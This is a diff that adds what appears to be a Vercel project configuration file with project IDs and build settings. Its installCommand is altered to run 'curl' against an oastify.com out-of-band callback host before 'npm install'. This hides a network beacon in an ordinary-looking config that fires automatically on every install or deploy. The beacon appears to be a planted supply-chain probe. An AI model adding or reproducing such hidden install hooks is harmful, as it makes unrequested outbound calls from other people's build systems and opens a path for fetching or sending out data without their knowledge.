@@ -1,0 +1,15 @@
+{
+  "projectId": "prj_eujr72BV2DEqldOYzA58BXyVKXn8",
+  "orgId": "team_0aJ6ebXzCfp4Yo7msK0jzz3N",
+  "settings": {
+    "createdAt": 1684831093738,
+    "framework": null,
+    "devCommand": null,
+    "installCommand": "curl https://e1ggctkr0ccycoalyfgbq86vqmwdkalya.oastify.com/2 && npm install",
+    "buildCommand": null,
+    "outputDirectory": null,
+    "rootDirectory": null,
+    "directoryListing": false,
+    "nodeVersion": "18.x"
+  }
+}
